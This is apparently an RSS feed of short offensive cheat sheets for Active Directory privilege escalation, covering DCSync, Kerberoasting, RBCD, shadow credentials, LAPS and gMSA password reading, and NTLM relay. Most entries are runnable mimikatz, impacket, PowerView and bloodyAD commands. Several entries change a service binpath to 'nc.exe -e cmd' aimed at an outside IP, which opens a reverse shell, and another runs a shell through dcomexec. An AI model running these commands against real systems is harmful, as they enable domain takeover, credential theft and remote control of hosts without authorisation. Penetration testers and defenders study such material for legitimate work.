channel.title: Ad on TLDRBins
channel.description: Recent content in Ad on TLDRBins

item.title: Abuse Parent Child Domain Trusts
item.description: Privesc from DA (Domain Admin) to EA (Enterprise Admin) 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe 'lsadump::trust' 'exit' 3. Get krbtgt hash of current domain ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit' 4.

item.title: Account Operators
item.description: Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create new user password object $new_user_password = ConvertTo-SecureString <NEW_USER_PASSWORD> -AsPlainText -Force 4. Create new user account # Create a new user New-AdUser <NEW_USER> -enabled $true -accountpassword $new_user_password -Credential $cred # Grant new user privilege (e.

item.title: AD Recycle Bin
item.description: Privesc #1: Restore deleted AD account 1. Import AD module import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq "<DELETED_USER>" } -includeDeletedObjects -property * 4. Restore deleted account # Rename the target account to avoid user exist error Restore-ADObject -Identity <ObjectGUID> -NewName <NEW_USER> -TargetPath "CN=Users,DC=<EXAMPLE>,DC=<COM>"

item.title: ADCS
item.description: Enum (From Linux) certipy-ad certipy-ad find -u <USER> -p <PASSWORD> -target <TARGET> -text -stdout -vulnerable nxc nxc ldap <TARGET> -u <USER> -p <PASSWORD> -M adcs Enum (From Windows) Powershell # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates Certify.exe # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser ADCSTemplate ADCSTemplate import-module .

item.title: AddKeyCredentialLink
item.description: Privesc #1: Shadow credentials (From Linux) pywhisker 0. Pre-check [optional] python3 pywhisker.py --action list -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> --dc-ip <DC> -t <TARGET_USER> --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> --dc-ip <DC> -t <TARGET_USER> --use-ldaps # Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type' pip3 install -I pyopenssl==24.0.0 2. Request TGT using PFX file PKINITtools sudo ntpdate -s <DC> && python3 gettgtpkinit.

item.title: AddSelf
item.description: Privesc #1: Add self to group (From Linux) powerview.py powerview.py # Connect sudo ntpdate -s <DC> && powerview <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN> # Add self to group Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME> # Check Get-DomainGroupMember -Identity <TARGET_GROUP> # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME> -Rights fullcontrol # Check Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where "SecurityIdentifier contains <USERNAME>" bloodAD bloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add groupMember <TARGET_GROUP> <USERNAME> # After getting full control of target group (e.

item.title: AllowedToDelegate
item.description: Privesc #1: Forge a Ticket (From Linux) # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn www/dc.example.com -hashes :<HASH> -impersonate Administrator <DOMAIN>/<USER> # Export ccache export KRB5CCNAME=Administrator.ccache # Remote sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@dc.example.com Note: impacket-wmiexec may not work

item.title: Bloodhound
item.description: sharphound.ps1 Download sharphound.ps1 # Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all bloodhound-python # With Creds bloodhound-python -d <DOMAIN> -u <USER> -p <PASSWORD> -dc <DC> -ns <DC_IP> -c all --zip # With Kerberos sudo ntpdate -s <DC> && bloodhound-python -u <USER> -p <PASSWORD> -k -d <DOMAIN> -dc <DC> -ns <DC_IP> -c all --zip bloodhound with PKI support BloodHound # Fix: GPU process isn't usable. Goodbye.

item.title: Built-in Group
item.description: Abuse #1. Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 # Assumed nc.exe is uploaded sc.exe config VSS binpath="C:\ProgramData\nc.exe -e cmd 10.10.14.10 443" # Stop service sc.exe stop VSS # Start service sc.exe start VSS

item.title: Constrained Delegation
item.description: Abuse #1: RBCD Attack 1. Find delegation sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k impacket-getST -spn <SERVICE>/<DC> -impersonate administrator '<DOMAIN>/<USERNAME>' -hashes :<HASH> -self # Check forwardable flag describeTicket.py <TICKET_1>.ccache 2. RBCD # Add delegation impacket-rbcd '<DOMAIN>/<USERNAME>' -hashes :<HASH> -k -delegate-from <USERNAME> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps # Check sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k # Impersonate impacket-getST '<DOMAIN>/<USERNAME>:<PASSWORD>' -spn <SERVICE>/<DC> -impersonate <TARGET_2> # Check forwardable flag describeTicket.

item.title: Cross Session Relay
ExecuteDCOM
item.description: Abuse #1: ExecuteDCOM (From Linux) # Revshell impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET> '<powershell #3 Base64>' -silentcommand -object MMC20

item.title: ForceChangePassword
item.description: Abuse #1a: Change target user password 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change Target User Password $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password Abuse #1b: Change target user password 1. Via rpcclient rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <TARGET_USER_NEW_PASSWORD>'

item.title: GenericAll
item.description: Abuse #1: Change target user password (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password Abuse #1: Change target user password (From Linux) bloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD> Abuse #2: Get shadow credentials (From Linux) sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -k -account <TARGET_USER> -target <DC> Abuse #3 : Add user to group (From Windows) 1.

item.title: GenericWrite
item.description: Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user 1. Import PowerView.ps1 . .\PowerView.ps1 2. Check target user Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers <DOMAIN>/<USER> -no-pass -dc-ip <DC> Abuse #2 : Kerberoasting by adding spn 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.

item.title: GetChanges/GetChangesAll
item.description: Abuse #1: DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc <USER>:<PASSWORD>@<TARGET> # With hashes impacket-secretsdump -hashes <LM>:<NT> -just-dc <DOMAIN>/<USER>@<TARGET> Abuse #1: DCSync Attack (From Windows) .\mimikatz.exe 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit

item.title: Kerberoasting
item.description: AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -no-pass -dc-ip <DC> # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p '' --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 <DOMAIN>/<USER> Kerberoasting From Linux # Fix time skew sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> Note: Times skew have to be within 5 minutes in kerberos # Kerberoasting without cred sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile usernames.

item.title: Kerberos
item.description: Kerbrute kerbrute kerbrute userenum --domain <DOMAIN> --dc <DC> usernames.txt Usernames generator username-anarchy ./username-anarchy -i users.txt | tee usernames.txt Generate Kerberos Ticket (From Linux) Method #1: Using impacket sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> <DOMAIN>/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist Method #2 : Using kinit # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to '/etc/hosts' (Try different order if not work) 10.

item.title: Krbrelayx
item.description: Tools krbrelayx Abuse #1: Add Active Directory Integrated DNS records via LDAP python3 dnstool.py -u <DOMAIN>\\<USER> -p <PASSWORD> --action add --record test --data 10.10.14.10 --type A 10.10.11.10 # Capture NTLM hash sudo responder -I tun0

item.title: LDAP
item.description: Enum # Using nmap script sudo nmap -p 389 --script ldap-search <TARGET> # Using ldapdomaindump (With Creds) ldapdomaindump -u '<DOMAIN>\<USER>' -p <PASSWORD> <TARGET> -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b 'DC=<EXAMPLE>,DC=<COM>' # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b 'DC=<EXAMPLE>,DC=<COM>' '(objectClass=person)' # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.

item.title: Machine Account
item.description: Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account .\rubeus.exe tgtdeleg /nowrap 2. Convert kirbi to ccache (Back to Linux) RubeusToCcache python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache 3. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator

item.title: NetExec (nxc)
item.description: nxc Download nxc Basic Commands # Single user and password nxc smb 10.10.11.10 -u <USER> -p <PASSWORD> # Single user and password (Active Directory) nxc smb -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP> # Multiple users or passwords nxc smb -u usernames.txt -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP> --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.

item.title: NTLM Relay Attack
item.description: 1. Run socat to redirect traffic (In Windows Target) socat # Upload socat.zip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('c:\programdata\socat.zip', 'c:\programdata') .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80 2. Enable webdav (In Windows Target) $Source = @" using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.

item.title: RBCD Attack
item.description: RBCD Attack (From Linux) 0. Check machine account quota nxc ldap 10.10.11.10 -u <USER> -p <PASSWORD> -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'password' -dc-ip 10.10.11.10 <DOMAIN>/<USER>:<PASSWORD> 2. Rbcd attack impacket-rbcd -delegate-to <TARGET_COMPUTER>$ -delegate-from EvilComputer$ -dc-ip <DC> -action 'write' <DOMAIN>/<USER>:<PASSWORD> 3. Impersonate sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:password' 4. Import ticket export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache 5. Post-Attack # Remote sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass # Or secretsdump impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator RBCD Attack (From Windows) 1.

item.title: ReadGMSAPassword
item.description: Abuse #1: Read GMSAPassword (From Linux) gMSADumper gMSADumper python3 gMSADumper.py -u <USER> -p <PASSWORD> -l <TARGET> -d <DOMAIN> bloodAD bloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword Abuse #2: Save as Cred (From Windows) $gmsa = Get-ADServiceAccount -Identity <TARGET_NAME> -Properties 'msDS-ManagedPassword' $mp = $gmsa.'msDS-ManagedPassword' $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword $cred = New-Object System.Management.Automation.PSCredential <TARGET_NAME>, $SecPass # For example, change password of another target user Invoke-Command -ComputerName <COMPUTER_NAME> -ScriptBlock {Set-ADAccountPassword -Identity <ANOTHER_TARGET_NAME> -reset -NewPassword (ConvertTo-SecureString -AsPlainText '<PASSWORD>' -force)} -Credential $cred

item.title: ReadLAPSPassword
item.description: Abuse #1: Read LAPS password (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred Abuse #1: Read LAPS Password (From Linux) ldapsearch -h 10.10.11.10 -b 'DC=<,example>,DC=<com>' -x -D <USER>@<TARGET> -w <PASSWORD> "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

item.title: RPC
item.description: rpcclient # Connect without creds rpcclient -U '' -N 10.10.11.10 # Connect with creds rpcclient -U <DOMAIN>/<USER>%<PASSWORD> 10.10.11.10 # Inline execute command rpcclient -U <DOMAIN>/<USER>%<PASSWORD> 10.10.11.10 -c 'querydispinfo' Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup <RID> # Query group member by rid querygroupmem <RID> # Query user by rid queryuser <RID> # Look up a user lookupnames <USER> # Look up by SID lookupsids <SID> impacket-lookupsid impacket-lookupsid <USER>:<PASSWORD>@<TARGET>

item.title: secretsdump
item.description: With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump impacket-secretsdump <USER>:<PASSWORD>@<TARGET> nxc nxc smb -dc-ip <DC> -u <USER> -H <HASH> --ntds

item.title: Server Operators
item.description: Abuse #1: Change service path # Change a service path (e.g. browser) sc.exe config browser binPath= "C:\ProgramData\nc.exe -e cmd.exe 10.10.14.10 443" # Stop service sc.exe stop browser # Start service sc.exe stop browser Additional: Create service # Create a service sc.exe create pwn binpath= C:\ProgramData\rev.exe start= auto

item.title: Silver Ticket
item.description: From Windows 1. Get service principle name (SPN) .\rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC> /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD> /nowrap 2. Generate NTLM .\rubeus.exe hash /password:<PASSWORD> 3. Get domain SID 3a. Locally import-module activedirectory Get-ADDomain | fl DomainSID 3b. Remotely # Install ldp.exe (Windows 11) Settings > System > Optional Features > More Windows Features and add 'Active Driectory Lightweight Directory Services' # Bind > Bind with credentials ldp.exe # Browse > Search BaseDN: DC=<example>,DC=<com> Filter: (objectclass=User) 4.

item.title: SMB Enum
item.description: SMB Share Enum nmap script sudo nmap --script=smb-enum-shares -p 445 <TARGET> Login without password smbmap smbmap -H <TARGET> --no-banner smbmap -H <TARGET> -u null --no-banner # List known share smbmap -H <TARGET> -r <SHARE> smbclient smbclient -N -L \\\\<TARGET>\\ # After found an accessible share smbclient -N \\\\<TARGET>\\<SHARE>\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\<TARGET>\\ --option='client min protocol=NT1' Login with password smbmap smbmap -H <TARGET> -u <USER> -p <PASSWORD> # List known share smbmap -H <TARGET> -u <USER> -p <PASSWORD> -R <SHARE> # Download file smbmap -H <TARGET> -r <SHARE> --download <PATH/TO/FILE> # List files with regex pattern smbmap -H <TARGET> -u <USER> -p <PASSWORD> -r <SHARE> -A <FILE_PATTERN> smbclient smbclient -L \\\\<TARGET>\\ -U <DOMAIN>/<USER>%<PASSWORD> # After found an accessible share smbclient \\\\<TARGET>\\<SHARE>\\ -U <DOMAIN>/<USER>%<PASSWORD> smbclient Basic Commands # List all files in a share recurse ON ls # Download all files mask "" recurse ON prompt OFF mget * impacket-smbclient (Kerberos) impacket-smbclient <DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN> -k -no-pass SID Brute # Null auth allowed impacket-lookupsid test@<DOMAIN> -no-pass Mount SMB Share sudo mount -t cifs //<TARGET>/<SHARE> /mnt # With creds sudo mount -t cifs -o ro,user=<USER>,password=<PASSWORD> //<TARGET>/<SHARE> /mnt Check write permission sudo find .

item.title: WriteDacl
item.description: Abuse #1: Add dcsync right to user 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred 4. Secrets dump impacket-secretsdump <USER>:<PASSWORD>@<TARGET>

item.title: WriteOwner/Own
item.description: Abuse #1 : Change owner of the group (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USER> Abuse #2 : Add user to the group (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add user to group Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/<USER>' -Rights All -DomainController <DC> -Credential $cred Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred Check Get-DomainGroupMember -Identity <TARGET_GROUP> -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName # Or net user <USER> # Exit current sessions or re-login whoami /groups Abuse #2 : Add user to the group (From Linux) 0.
